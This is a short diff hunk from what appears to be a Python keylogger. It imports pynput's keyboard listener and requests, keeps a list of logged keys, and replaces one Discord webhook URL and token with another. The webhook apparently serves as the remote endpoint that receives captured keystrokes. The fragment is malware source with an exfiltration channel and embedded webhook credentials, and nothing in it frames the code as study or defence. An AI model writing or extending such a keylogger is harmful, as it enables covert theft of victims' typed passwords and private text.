@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener
 import requests
 
 # Your Discord webhook URL
-webhook_url = "https://discord.com/api/webhooks/1268231583819894814/UMLFp6cr4ppliC3hSy1GPA9jC1hyXQhOFdRxGcCFMW9ht9oBqqVtzI7_Px5xlNRcd4iR"
+webhook_url = "https://discord.com/api/webhooks/1268235679234785280/W88Z74qqgAOHw8XIVqAtJZcwu-umuq5Gk9Q-FUNuVIjCDpvm_tRb7NDTWJ-2pfCee5u6"
 
 # This will store the logged keys
 logged_keys = []
